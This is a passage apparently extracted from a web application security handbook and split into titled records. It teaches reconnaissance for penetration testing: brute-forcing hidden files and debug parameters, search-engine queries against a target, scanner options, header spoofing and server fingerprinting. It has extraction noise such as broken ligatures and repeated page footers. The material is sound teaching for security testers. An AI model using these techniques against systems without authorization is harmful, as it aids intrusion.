resources:\nhttp://eis/pub/media/100\nhttp://eis/pub/media/117\nhttp://eis/pub/user/11\nOther numeric values in a similar range are likely to identify further resources\nand information.\nTIP Burp Intruder is highly customizable and can be used to target any por-\ntion of an HTTP request. Figure 4-7 shows Burp Intruder being used to per-\nform a brute-force attack on the fi rst half of a fi lename to make the requests:\nhttp://eis/auth/AddPassword\nhttp://eis/auth/ForgotPassword\nhttp://eis/auth/GetPassword\nhttp://eis/auth/ResetPassword\nhttp://eis/auth/RetrievePassword\nhttp://eis/auth/UpdatePassword\n...\nFigure 4-7: Burp Intruder being used to perform a customized brute-force attack on\npart of a filename\ncc0044..iinndddd 8866 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 87\nChapter 4 n Mapping the Application 87\nHACK STEPS\n1. Review the results of your user-directed browsing and basic brute-force\nexercises. Compile lists of the names of all enumerated subdirectories, file\nstems, and file extensions.\n2. Review these lists to identify any naming schemes in use. For example, if\nthere are pages called AddDocument.jsp and ViewDocument.jsp, there\nmay also be pages called EditDocument.jsp and RemoveDocument.jsp.\nYou can often get a feel for developers’ naming habits just by reading a\nfew examples. For example, depending on their personal style, develop-\ners may be verbose (AddANewUser.asp), succinct (AddUser.asp), use\nabbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting\na feel for the naming styles in use may help you guess the precise names\nof content you have not already identified.\n3. Sometimes, the naming scheme used for different content employs\nidentifiers such as numbers and dates, which can make inferring hidden\ncontent easy. This is most commonly encountered in the names of static\nresources, rather than dynamic scripts. For example, if a company’s web-\nsite links to AnnualReport2009.pdf and AnnualReport2010.pdf,\nit should be a short step to identifying what the next report will be called.\nSomewhat incredibly, there have been notorious cases of companies\nplacing files containing financial reports on their web servers before they\nwere publicly announced, only to have wily journalists discover them\nbased on the naming scheme used in earlier years.\n4. Review all client-side code such as HTML and JavaScript to identify any\nclues about hidden server-side content. These may include HTML com-\nments related to protected or unlinked functions, HTML forms with dis-\nabledSUBMIT elements, and the like. Often, comments are automatically\ngenerated by the software that has been used to generate web content,\nor by the platform on which the application is running. References to\nitems such as server-side include files are of particular interest. These\nfiles may actually be publicly downloadable and may contain highly sensi-\ntive information such as database connection strings and passwords. In\nother cases, developers’ comments may contain all kinds of useful tidbits,\nsuch as database names, references to back-end components, SQL query\nstrings, and so on. Thick-client components such as Java applets and\nActiveX controls may also contain sensitive data that you can extract. See\nChapter 15 for more ways in which the application may disclose informa-\ntion about itself.\nContinued\ncc0044..iinndddd 8877 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 88\n88 Chapter 4 n Mapping the Application\nHACK STEPS (continued)\n5. Add to the lists of enumerated items any further potential names con-\njectured on the basis of the items that you have discovered. Also add to\nthe file extension list common extensions such as txt,bak,src,inc,\nandold, which may uncover the source to backup versions of live pages.\nAlso add extensions associated with the development languages in use,\nsuch as .java and .cs, which may uncover source files that have been\ncompiled into live pages. (See the tips later in this chapter for identifying\ntechnologies in use.)\n6. Search for temporary files that may have been created inadvertently by\ndeveloper tools and file editors. Examples include the .DS_Store file,\nwhich contains a directory index under OS X, file.php~1, which is a\ntemporary file created when file.php is edited, and the .tmp file exten-\nsion that is used by numerous software tools.\n7. Perform further automated exercises, combining the lists of directories,\nfile stems, and file extensions to request large numbers of potential\nresources. For example, in a given directory, request each file stem com-\nbined with each file extension. Or request each directory name as a subdi-\nrectory of every known directory.\n8. Where a consistent naming scheme has been identified, consider perform-\ning a more focused brute-force exercise. For example, if AddDocument\n.jsp and ViewDocument.jsp are known to exist, you may create\na list of actions (edit, delete, create) and make requests of the form\nXxxDocument.jsp. Alternatively, create a list of item types (user, account,\nfile) and make requests of the form AddXxx.jsp.\n9. Perform each exercise recursively, using new enumerated content and\npatterns as the basis for further user-directed spidering and further auto-\nmated content discovery. You are limited only by your imagination, time\navailable, and the importance you attach to discovering hidden content\nwithin the application you are targeting.\nNOTE You can use the Content Discovery feature of Burp Suite Pro to auto-\nmate most of the tasks described so far. After you have manually mapped an\napplication’s visible content using your browser, you can select one or more\nbranches of Burp’s site map and initiate a content discovery session on those\nbranches.\nBurp uses the following techniques when attempting to discover new\ncontent:\nn Brute force using built-in lists of common fi le and directory names\nn Dynamic generation of wordlists based on resource names observed\nwithin the target application\nn Extrapolation of resource names containing numbers and dates\ncc0044..iinndddd 8888 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 89\nChapter 4 n Mapping the Application 89\nn Testing for alternative fi le extensions on identifi ed resources\nn Spidering from discovered content\nn Automatic fi ngerprinting of valid and invalid responses to reduce false\npositives\nAll exercises are carried out recursively, with new discovery tasks being\nscheduled as new application content is discovered. Figure 4-8 shows a con-\ntent discovery session in progress against the EIS application.\nFigure 4-8: A content discovery session in progress against the EIS application\nTIP The DirBuster project from OWASP is also a useful resource when per-\nforming automated content discovery tasks. It includes large lists of directory\nnames that have been found in the wild, ordered by frequency of occurrence.\nUse of Public Information\nThe application may contain content and functionality that are not presently linked\nfrom the main content but that have been linked in the past. In this situation,\nit is likely that various historical repositories will still contain references to the\nhidden content. Two main types of publicly available resources are useful here:\nn Search engines such as Google, Yahoo, and MSN. These maintain a fi ne-\ngrained index of all content that their powerful spiders have discovered,\nand also cached copies of much of this content, which persists even after\nthe original content has been removed.\nn Web archives such as the WayBack Machine, located at www.archive.org/.\nThese archives maintain a historical record of a large number of websites.\nIn many cases they allow users to browse a fully replicated snapshot of a\ngiven site as it existed at various dates going back several years.\ncc0044..iinndddd 8899 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 90\n90 Chapter 4 n Mapping the Application\nIn addition to content that has been linked in the past, these resources are\nalso likely to contain references to content that is linked from third-party sites,\nbut not from within the target application itself. For example, some applications\ncontain restricted functionality for use by their business partners. Those part-\nners may disclose the existence of the functionality in ways that the application\nitself does not.\nHACK STEPS\n1. Use several different search engines and web archives (listed previously)\nto discover what content they indexed or stored for the application you\nare attacking.\n2. When querying a search engine, you can use various advanced techniques\nto maximize the effectiveness of your research. The following suggestions\napply to Google. You can find the corresponding queries on other engines\nby selecting their Advanced Search option.\nn site:www.wahh-target.com returns every resource within the target\nsite that Google has a reference to.\nn site:www.wahh-target.com login returns all the pages containing the\nexpression login. In a large and complex application, this technique can\nbe used to quickly home in on interesting resources, such as site maps,\npassword reset functions, and administrative menus.\nn link:www.wahh-target.com returns all the pages on other websites\nand applications that contain a link to the target. This may include links\nto old content, or functionality that is intended for use only by third par-\nties, such as partner links.\nn related:www.wahh-target.com returns pages that are “similar” to the\ntarget and therefore includes a lot of irrelevant material. However, it may\nalso discuss the target on other sites, which may be of interest.\n3. Perform each search not only in the default Web section of Google, but\nalso in Groups and News, which may contain different results.\n4. Browse to the last page of search results for a given query, and select\nRepeat the Search with the Omitted Results Included. By default, Google\nattempts to filter out redundant results by removing pages that it believes\nare sufficiently similar to others included in the results. Overriding this\nbehavior may uncover subtly different pages that are of interest to you\nwhen attacking the application.\n5. View the cached version of interesting pages, including any content that is\nno longer present in the actual application. In some cases, search engine\ncaches contain resources that cannot be directly accessed in the applica-\ntion without authentication or payment.\ncc0044..iinndddd 9900 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 91\nChapter 4 n Mapping the Application 91\n6. Perform the same queries on other domain names belonging to the same\norganization, which may contain useful information about the application\nyou are targeting.\nIf your research identifi es old content and functionality that is no longer\nlinked to within the main application, it may still be present and usable. The\nold functionality may contain vulnerabilities that do not exist elsewhere\nwithin the application.\nEven where old content has been removed from the live application, the\ncontent obtained from a search engine cache or web archive may contain\nreferences to or clues about other functionality that is still present within the\nlive application and that can be used to attack it.\nAnother public source of useful information about the target application is\nany posts that developers and others have made to Internet forums. There are\nnumerous such forums in which software designers and programmers ask\nand answer technical questions. Often, items posted to these forums contain\ninformation about an application that is of direct benefi t to an attacker, including\nthe technologies in use, the functionality implemented, problems encountered\nduring development, known security bugs, confi guration and log fi les submit-\nted to assist in troubleshooting, and even extracts of source code.\nHACK STEPS\n1. Compile a list containing every name and e-mail address you can discover\nrelating to the target application and its development. This should include\nany known developers, names found within HTML source code, names found\nin the contact information section of the main company website, and any\nnames disclosed within the application itself, such as administrative staff.\n2. Using the search techniques described previously, search for each identi-\nfied name to find any questions and answers they have posted to Internet\nforums. Review any information found for clues about functionality or vul-\nnerabilities within the target application.\nLeveraging the Web Server\nVulnerabilities may exist at the web server layer that enable you to discover\ncontent and functionality that are not linked within the web application itself.\nFor example, bugs within web server software can allow an attacker to list the\ncontents of directories or obtain the raw source for dynamic server-executable\npages. See Chapter 18 for some examples of these vulnerabilities and ways in\nwhich you can identify them. If such a bug exists, you may be able to exploit it to\ndirectly obtain a listing of all pages and other resources within the application.\ncc0044..iinndddd 9911 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 92\n92 Chapter 4 n Mapping the Application\nMany application servers ship with default content that may help you attack\nthem. For example, sample and diagnostic scripts may contain known vul-\nnerabilities or functionality that may be leveraged for a malicious purpose.\nFurthermore, many web applications incorporate common third-party com-\nponents for standard functionality, such as shopping carts, discussion forums,\nor content management system (CMS) functions. These are often installed to a\nfi xed location relative to the web root or to the application’s starting directory.\nAutomated tools lend themselves naturally to this type of task, and many\nissue requests from a large database of known default web server content, third-\nparty application components, and common directory names. While these tools\ndo not rigorously test for any hidden custom functionality, they can often be\nuseful in discovering other resources that are not linked within the application\nand that may be of interest in formulating an attack.\nWikto is one of the many free tools that performs these types of scans, addi-\ntionally containing a confi gurable brute-force list for content. As shown in\nFigure 4-9, when used against the Extreme Internet Shopping site, it identifi es\nsome directories using its internal wordlist. Because it has a large database of\ncommon web application software and scripts, it has also identifi ed the fol-\nlowing directory, which an attacker would not discover through automated or\nuser-driven spidering:\nhttp://eis/phpmyadmin/\nFigure 4-9: Wikto being used to discover content and some known vulnerabilities\nAdditionally, although the /gb directory had already been identifi ed via\nspidering, Wikto has identifi ed the specifi c URL:\n/gb/index.php?login=true\nWikto checks for this URL because it is used in the gbook PHP application,\nwhich contains a publicly known vulnerability.\ncc0044..iinndddd 9922 88//1199//22001111 1122::0044::4444 PPMM"
  },
  {
    "input": "Application Pages Versus Functional Paths",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 93\nChapter 4 n Mapping the Application 93\nWARNING Like many commercial web scanners, tools such as Nikto and\nWikto contain vast lists of default fi les and directories and consequently appear\nto be industrious at performing a huge number of checks. However, a large\nnumber of these checks are redundant, and false positives are common. Worse\nstill, false negatives may occur regularly if a server is confi gured to hide a ban-\nner, if a script or collection of scripts is moved to a different directory, or if\nHTTP status codes are handled in a custom manner. For this reason it is often\nbetter to use a tool such as Burp Intruder, which allows you to interpret the raw\nresponse information and does not attempt to extract positive and negative\nresults on your behalf.\nHACK STEPS\nSeveral useful options are available when you run Nikto:\n1. If you believe that the server is using a nonstandard location for interest-\ning content that Nikto checks for (such as /cgi/cgi-bin instead of\n/cgi-bin), you can specify this alternative location using the option –root\n/cgi/. For the specific case of CGI directories, these can also be specified\nusing the option –Cgidirs.\n2. If the site uses a custom “file not found” page that does not return the\nHTTP 404 status code, you can specify a particular string that identifies\nthis page by using the -404 option.\n3. Be aware that Nikto does not perform any intelligent verification of\npotential issues and therefore is prone to report false positives. Always\ncheck any results Nikto returns manually.\nNote that with tools like Nikto, you can specify a target application using its\ndomain name or IP address. If a tool accesses a page using its IP address, the\ntool treats links on that page that use its domain name as belonging to a dif-\nferent domain, so the links are not followed. This is reasonable, because some\napplications are virtually hosted, with multiple domain names sharing the\nsame IP address. Ensure that you confi gure your tools with this fact in mind.\nApplication Pages Versus Functional Paths\nThe enumeration techniques described so far have been implicitly driven by one\nparticular picture of how web application content may be conceptualized and\ncataloged. This picture is inherited from the pre-application days of the World\nWide Web, in which web servers functioned as repositories of static informa-\ntion, retrieved using URLs that were effectively fi lenames. To publish some web\ncontent, an author simply generated a bunch of HTML fi les and copied these\ninto the relevant directory on a web server. When users followed hyperlinks,\ncc0044..iinndddd 9933 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 94\n94 Chapter 4 n Mapping the Application\nthey navigated the set of fi les created by the author, requesting each fi le via its\nname within the directory tree residing on the server.\nAlthough the evolution of web applications has fundamentally changed the\nexperience of interacting with the web, the picture just described is still appli-\ncable to the majority of web application content and functionality. Individual\nfunctions are typically accessed via a unique URL, which is usually the name\nof the server-side script that implements the function. The parameters to the\nrequest (residing in either the URL query string or the body of a POST request)\ndo not tell the application what function to perform; they tell it what information\nto use when performing it. In this context, the methodology of constructing a\nURL-based map can be effective in cataloging the application’s functionality.\nIn applications that use REST-style URLs, parts of the URL fi le path contain\nstrings that in fact function as parameter values. In this situation, by map-\nping URLs, a spider maps both the application functions and the list of known\nparameter values to those functions.\nIn some applications, however, the picture based on application “pages”\nis inappropriate. Although it may be possible to shoehorn any application’s\nstructure into this form of representation, in many cases a different picture,\nbased on functional paths, is far more useful for cataloging its content and\nfunctionality. Consider an application that is accessed using only requests of\nthe following form:\nPOST /bank.jsp HTTP/1.1\nHost: wahh-bank.com\nContent-Length: 106\nservlet=TransferFunds&method=confirmTransfer&fromAccount=10372918&to\nAccount=\n3910852&amount=291.23&Submit=Ok\nHere, every request is made to a single URL. The parameters to the request\nare used to tell the application what function to perform by naming the Java\nservlet and method to invoke. Further parameters provide the information to\nuse in performing the function. In the picture based on application pages, the\napplication appears to have only a single function, and a URL-based map does\nnot elucidate its functionality. However, if we map the application in terms of\nfunctional paths, we can obtain a much more informative and useful catalog of\nits functionality. Figure 4-10 is a partial map of the functional paths that exist\nwithin the application.\ncc0044..iinndddd 9944 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 95\nChapter 4 n Mapping the Application 95\nWahhBank.\nlogin\nWahhBank.\nhome\nTransferFunds. BillPayment. BillPayment. WahhBank.\nselectAccounts addPayee selectPayee logout\nTransferFunds. BillPayment.\nenterAmount enterAmount\nTransferFunds. BillPayment.\nconfirmTransfer confirmPayment\nFigure 4-10: A mapping of the functional paths within a web application\nRepresenting an application’s functionality in this way is often more useful\neven in cases where the usual picture based on application pages can be applied\nwithout any problems. The logical relationships and dependencies between\ndifferent functions may not correspond to the directory structure used within\nURLs. It is these logical relationships that are of most interest to you, both in\nunderstanding the application’s core functionality and in formulating possible\nattacks against it. By identifying these, you can better understand the expec-\ntations and assumptions of the application’s developers when implementing\nthe functions. You also can attempt to fi nd ways to violate these assumptions,\ncausing unexpected behavior within the application.\nIn applications where functions are identifi ed using a request parameter, rather\nthan the URL, this has implications for the enumeration of application content.\nIn the previous example, the content discovery exercises described so far are\nunlikely to uncover any hidden content. Those techniques need to be adapted\nto the mechanisms actually used by the application to access functionality.\ncc0044..iinndddd 9955 88//1199//22001111 1122::0044::4444 PPMM"
  },
  {
    "input": "Discovering Hidden Parameters",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 96\n96 Chapter 4 n Mapping the Application\nHACK STEPS\n1. Identify any instances where application functionality is accessed not by\nrequesting a specific page for that function (such as /admin/editUser.jsp)\nbut by passing the name of a function in a parameter (such as\n/admin.jsp?action=editUser).\n2. Modify the automated techniques described for discovering URL-specified\ncontent to work on the content-access mechanisms in use within the\napplication. For example, if the application uses parameters that spec-\nify servlet and method names, first determine its behavior when an\ninvalid servlet and/or method is requested, and when a valid method is\nrequested with other invalid parameters. Try to identify attributes of the\nserver’s responses that indicate “hits” — valid servlets and methods. If\npossible, find a way of attacking the problem in two stages, first enumer-\nating servlets and then methods within these. Using a method similar to\nthe one used for URL-specified content, compile lists of common items,\nadd to these by inferring from the names actually observed, and generate\nlarge numbers of requests based on these.\n3. If applicable, compile a map of application content based on functional\npaths, showing all the enumerated functions and the logical paths and\ndependencies between them.\nDiscovering Hidden Parameters\nA variation on the situation where an application uses request parameters to\nspecify which function should be performed arises where other parameters\nare used to control the application’s logic in signifi cant ways. For example, an\napplication may behave differently if the parameter debug=true is added to the\nquery string of any URL. It might turn off certain input validation checks, allow\nthe user to bypass certain access controls, or display verbose debug informa-\ntion in its response. In many cases, the fact that the application handles this\nparameter cannot be directly inferred from any of its content (for example, it\ndoes not include debug=false in the URLs it publishes as hyperlinks). The effect\nof the parameter can only be detected by guessing a range of values until the\ncorrect one is submitted.\ncc0044..iinndddd 9966 88//1199//22001111 1122::0044::4444 PPMM"
  },
  {
    "input": "Analyzing the Application",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 97\nChapter 4 n Mapping the Application 97\nHACK STEPS\n1. Using lists of common debug parameter names (debug, test, hide, source,\netc.) and common values (true, yes, on, 1, etc.), make a large number of\nrequests to a known application page or function, iterating through all\npermutations of name and value. For POST requests, insert the added\nparameter to both the URL query string and the message body.\nBurp Intruder can be used to perform this test using multiple payload\nsets and the “cluster bomb” attack type (see Chapter 14 for more details).\n2. Monitor all responses received to identify any anomalies that may indicate\nthat the added parameter has had an effect on the application’s processing.\n3. Depending on the time available, target a number of different pages or\nfunctions for hidden parameter discovery. Choose functions where it is\nmost likely that developers have implemented debug logic, such as login,\nsearch, and file uploading and downloading.\nAnalyzing the Application\nEnumerating as much of the application’s content as possible is only one ele-\nment of the mapping process. Equally important is the task of analyzing the\napplication’s functionality, behavior, and technologies employed to identify the\nkey attack surfaces it exposes and to begin formulating an approach to probing\nthe application for exploitable vulnerabilities.\nHere are some key areas to investigate:\nn The application’s core functionality — the actions that can be leveraged\nto perform when used as intended\nn Other, more peripheral application behavior, including off-site links, error\nmessages, administrative and logging functions, and the use of redirects\nn The core security mechanisms and how they function — in particular,\nmanagement of session state, access controls, and authentication mecha-\nnisms and supporting logic (user registration, password change, and\naccount recovery)\ncc0044..iinndddd 9977 88//1199//22001111 1122::0044::4444 PPMM"
  },
  {
    "input": "Identifying Entry Points for User Input",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 98\n98 Chapter 4 n Mapping the Application\nn All the different locations at which the application processes user-supplied\ninput — every URL, query string parameter, item of POST data, and cookie\nn The technologies employed on the client side, including forms, client-\nside scripts, thick-client components (Java applets, ActiveX controls, and\nFlash), and cookies\nn The technologies employed on the server side, including static and dynamic\npages, the types of request parameters employed, the use of SSL, web\nserver software, interaction with databases, e-mail systems, and other\nback-end components\nn Any other details that may be gleaned about the internal structure and\nfunctionality of the server-side application — the mechanisms it uses\nbehind the scenes to deliver the functionality and behavior that are vis-\nible from the client perspective\nIdentifying Entry Points for User Input\nThe majority of ways in which the application captures user input for server-\nside processing should be obvious when reviewing the HTTP requests that are\ngenerated as you walk through the application’s functionality. Here are the key\nlocations to pay attention to:\nn Every URL string up to the query string marker\nn Every parameter submitted within the URL query string\nn Every parameter submitted within the body of a POST request\nn Every cookie\nn Every other HTTP header that the application might process — in particu-\nlar, the User-Agent,Referer,Accept,Accept-Language, and Host headers\nURL File Paths\nThe parts of the URL that precede the query string are often overlooked as entry\npoints, since they are assumed to be simply the names of directories and fi les\non the server fi le system. However, in applications that use REST-style URLs,\nthe parts of the URL that precede the query string can in fact function as data\nparameters and are just as important as entry points for user input as the query\nstring itself.\nA typical REST-style URL could have this format:\nhttp://eis/shop/browse/electronics/iPhone3G/\ncc0044..iinndddd 9988 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 99\nChapter 4 n Mapping the Application 99\nIn this example, the strings electronics and iPhone3G should be treated as\nparameters to store a search function.\nSimilarly, in this URL:\nhttp://eis/updates/2010/12/25/my-new-iphone/\neach of the URL components following updates may be being handled in a\nRESTful manner.\nMost applications using REST-style URLs are easy to identify given the URL\nstructure and application context. However, no hard-and-fast rules should be\nassumed when mapping an application, because it is up to the application’s\nauthors how users should interact with it.\nRequest Parameters\nParameters submitted within the URL query string, message body, and HTTP\ncookies are the most obvious entry points for user input. However, some appli-\ncations do not employ the standard name=value format for these parameters.\nThey may employ their own custom scheme, which may use nonstandard query\nstring markers and fi eld separators, or they may embed other data schemes such\nas XML within parameter data.\nHere are some examples of nonstandard parameter formats that the authors\nhave encountered in the wild:\nn /dir/file;foo=bar&foo2=bar2\nn /dir/file?foo=bar$foo2=bar2\nn /dir/file/foo%3dbar%26foo2%3dbar2\nn /dir/foo.bar/file\nn /dir/foo=bar/file\nn /dir/file?param=foo:bar\nn /dir/file?data=%3cfoo%3ebar%3c%2ffoo%3e%3cfoo2%3ebar2%3c%2ffoo2%3e\nIf a nonstandard parameter format is being used, you need to take this into\naccount when probing the application for all kinds of common vulnerabilities.\nFor example, suppose that, when testing the fi nal URL in this list, you ignore the\ncustom format and simply treat the query string as containing a single parameter\ncalled data, and therefore submit various kinds of attack payloads as the value\nof this parameter. You would miss many kinds of vulnerabilities that may exist\nin the processing of the query string. Conversely, if you dissect the format and\nplace your payloads within the embedded XML data fi elds, you may immediately\ndiscover a critical bug such as SQL injection or path traversal.\ncc0044..iinndddd 9999 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 100\n100 Chapter 4 n Mapping the Application\nHTTP Headers\nMany applications perform custom logging functions and may log the contents\nof HTTP headers such as Referer and User-Agent. These headers should always\nbe considered as possible entry points for input-based attacks.\nSome applications perform additional processing on the Referer header. For\nexample, an application may detect that a user has arrived via a search engine,\nand seek to provide a customized response tailored to the user’s search query.\nThe application may echo the search term or may attempt to highlight matching\nexpressions within the response. Some applications seek to boost their search\nrankings by dynamically adding content such as HTML keywords, containing\nstrings that recent visitors from search engines have been searching for. In this\nsituation, it may be possible to persistently inject content into the application’s\nresponses by making a request numerous times containing a suitably crafted\nReferer URL.\nAn important trend in recent years has been for applications to present dif-\nferent content to users who access the application via different devices (laptop,\ncell phone, tablet). This is achieved by inspecting the User-Agent header. As well\nas providing an avenue for input-based attacks directly within the User-Agent\nheader itself, this behavior provides an opportunity to uncover an additional\nattack surface within the application. By spoofi ng the User-Agent header for\na popular mobile device, you may be able to access a simplifi ed user interface\nthat behaves differently than the primary interface. Since this interface is gener-\nated via different code paths within the server-side application, and may have\nbeen subjected to less security testing, you may identify bugs such as cross-site\nscripting that do not exist in the primary application interface.\nTIP Burp Intruder contains a built-in payload list containing a large number\nof user agent strings for different types of devices. You can carry out a simple\nattack that performs a GET request to the main application page supplying\ndifferent user agent strings and then review the intruder results to identify\nanomalies that suggest a different user interface is being presented.\nIn addition to targeting HTTP request headers that your browser sends by\ndefault, or that application components add, in some situations you can per-\nform successful attacks by adding further headers that the application may\nstill process. For example, many applications perform some processing on the\nclient’s IP address to carry out functions such as logging, access control, or\nuser geolocation. The IP address of the client’s network connection typically\nis available to applications via platform APIs. However, to handle cases where\nthe application resides behind a load balancer or proxy, applications may use\nthe IP address specifi ed in the X-Forwarded-For request header if it is present.\nDevelopers may then mistakenly assume that the IP address value is untainted\nand process it in dangerous ways. By adding a suitably crafted X-Forwarded-For\ncc0044..iinndddd 110000 88//1199//22001111 1122::0044::4455 PPMM"
  },
  {
    "input": "Identifying Server-Side Technologies",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 101\nChapter 4 n Mapping the Application 101\nheader, you may be able to deliver attacks such as SQL injection or persistent\ncross-site scripting.\nOut-of-Band Channels\nA fi nal class of entry points for user input includes any out-of-band channel\nby which the application receives data that you may be able to control. Some\nof these entry points may be entirely undetectable if you simply inspect the\nHTTP traffi c generated by the application, and fi nding them usually requires\nan understanding of the wider context of the functionality that the application\nimplements. Here are some examples of web applications that receive user-\ncontrollable data via an out-of-band channel:\nn A web mail application that processes and renders e-mail messages received\nvia SMTP\nn A publishing application that contains a function to retrieve content via\nHTTP from another server\nn An intrusion detection application that gathers data using a network\nsniffer and presents this using a web application interface\nn Any kind of application that provides an API interface for use by non-\nbrowser user agents, such as cell phone apps, if the data processed via\nthis interface is shared with the primary web application\nIdentifying Server-Side Technologies\nNormally it is possible to fi ngerprint the technologies employed on the server\nvia various clues and indicators.\nBanner Grabbing\nMany web servers disclose fi ne-grained version information, both about the\nweb server software itself and about other components that have been installed.\nFor example, the HTTP Server header discloses a huge amount of detail about\nsome installations:\nServer: Apache/1.3.31 (Unix) mod_gzip/1.3.26.1a mod_auth_passthrough/\n1.8 mod_log_bytes/1.2 mod_bwlimited/1.4 PHP/4.3.9 FrontPage/\n5.0.2.2634a mod_ssl/2.8.20 OpenSSL/0.9.7a\nIn addition to the Server header, the type and version of software may be dis-\nclosed in other locations:\nn Templates used to build HTML pages\nn Custom HTTP headers\nn URL query string parameters\ncc0044..iinndddd 110011 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 102\n102 Chapter 4 n Mapping the Application\nHTTP Fingerprinting\nIn principle, any item of information returned by the server may be customized\nor even deliberately falsifi ed, and banners like the Server header are no excep-\ntion. Most application server software allows the administrator to confi gure the\nbanner returned in the Server HTTP header. Despite measures such as this, it is\nusually possible for a determined attacker to use other aspects of the web server’s\nbehavior to determine the software in use, or at least narrow down the range of\npossibilities. The HTTP specifi cation contains a lot of detail that is optional or left\nto an implementer’s discretion. Also, many web servers deviate from or extend\nthe specifi cation in various ways. As a result, a web server can be fi ngerprinted\nin numerous subtle ways, other than via its Server banner. Httprecon is a handy\ntool that performs a number of tests in an attempt to fi ngerprint a web server’s\nsoftware. Figure 4-11 shows Httprecon running against the EIS application and\nreporting various possible web servers with different degrees of confi dence.\nFigure 4-11: Httprecon fingerprinting the EIS application\nFile Extensions\nFile extensions used within URLs often disclose the platform or programming\nlanguage used to implement the relevant functionality. For example:\nn asp — Microsoft Active Server Pages\nn aspx — Microsoft ASP.NET\ncc0044..iinndddd 110022 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 103\nChapter 4 n Mapping the Application 103\nn jsp — Java Server Pages\nn cfm — Cold Fusion\nn php — The PHP language\nn d2w — WebSphere\nn pl — The Perl language\nn py — The Python language\nn dll — Usually compiled native code (C or C++)\nn nsf or ntf — Lotus Domino\nEven if an application does not employ a particular fi le extension in its published\ncontent, it is usually possible to verify whether the technology supporting that\nextension is implemented on the server. For example, if ASP.NET is installed,\nrequesting a nonexistent .aspx fi le returns a customized error page generated\nby the ASP.NET framework, as shown in Figure 4-12. Requesting a nonexistent\nfi le with a different extension returns a generic error message generated by the\nweb server, as shown in Figure 4-13.\nFigure 4-12: A customized error page indicating that the ASP.NET platform is present on\nthe server\nUsing the automated content discovery techniques already described, it\nis possible to request a large number of common fi le extensions and quickly\nconfi rm whether any of the associated technologies are implemented on the\nserver.\nThe divergent behavior described arises because many web servers map\nspecifi c fi le extensions to particular server-side components. Each different\ncomponent may handle errors (including requests for nonexistent content) dif-\nferently. Figure 4-14 shows the various extensions that are mapped to different\nhandler DLLs in a default installation of IIS 5.0.\ncc0044..iinndddd 110033 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 104\n104 Chapter 4 n Mapping the Application\nFigure 4-13: A generic error message created when an unrecognized file extension is\nrequested\nFigure 4-14: File extension mappings in IIS 5.0\nIt is possible to detect the presence of each fi le extension mapping via the\ndifferent error messages generated when that fi le extension is requested. In\nsome cases, discovering a particular mapping may indicate the presence of a\nweb server vulnerability. For example, the .printer and .ida/.idq handlers\nin IIS have in the past been found vulnerable to buffer overfl ow vulnerabilities.\nAnother common fi ngerprint to be aware of are URLs that look like this:\nhttps://wahh-app/news/0,,2-421206,00.html\ncc0044..iinndddd 110044 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 105\nChapter 4 n Mapping the Application 105\nThe comma-separated numbers toward the end of the URL are usually gener-\nated by the Vignette content management platform.\nDirectory Names\nIt is common to encounter subdirectory names that indicate the presence of an\nassociated technology. For example:\nn servlet — Java servlets\nn pls — Oracle Application Server PL/SQL gateway\nn cfdocs or cfide — Cold Fusion\nn SilverStream — The SilverStream web server\nn WebObjects or {function}.woa — Apple WebObjects\nn rails — Ruby on Rails\nSession Tokens\nMany web servers and web application platforms generate session tokens by default\nwith names that provide information about the technology in use. For example:\nn JSESSIONID — The Java Platform\nn ASPSESSIONID — Microsoft IIS server\nn ASP.NET_SessionId — Microsoft ASP.NET\nn CFID/CFTOKEN — Cold Fusion\nn PHPSESSID — PHP\nThird-Party Code Components\nMany web applications incorporate third-party code components to implement\ncommon functionality such as shopping carts, login mechanisms, and message\nboards. These may be open source or may have been purchased from an external\nsoftware developer. When this is the case, the same components often appear\nwithin numerous other web applications on the Internet, which you can inspect to\nunderstand how the component functions. Often, other applications use different\nfeatures of the same component, enabling you to identify additional behavior and\nfunctionality beyond what is directly visible in the target application. Also, the\nsoftware may contain known vulnerabilities that have been discussed elsewhere,\nor you may be able to download and install the component yourself and perform\na source code review or probe it for defects in a controlled way.\ncc0044..iinndddd 110055 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 106\n106 Chapter 4 n Mapping the Application\nHACK STEPS\n1. Identify all entry points for user input, including URLs, query string param-\neters,POST data, cookies, and other HTTP headers processed by the\napplication.\n2. Examine the query string format used by the application. If it does not\nemploy the standard format described in Chapter 3, try to understand\nhow parameters are being transmitted via the URL. Virtually all custom\nschemes still employ some variation on the name/value model, so try to\nunderstand how name/value pairs are being encapsulated into the non-\nstandard URLs you have identified.\n3. Identify any out-of-bound channels via which user-controllable or other\nthird-party data is being introduced into the application’s processing.\n4. View the HTTP Server banner returned by the application. Note that in\nsome cases, different areas of the application are handled by different\nback-end components, so different Server headers may be received.\n6. Check for any other software identifiers contained within any custom\nHTTP headers or HTML source code comments.\n7. Run the httprint tool to fingerprint the web server.\n8. If fine-grained information is obtained about the web server and other\ncomponents, research the software versions in use to identify any 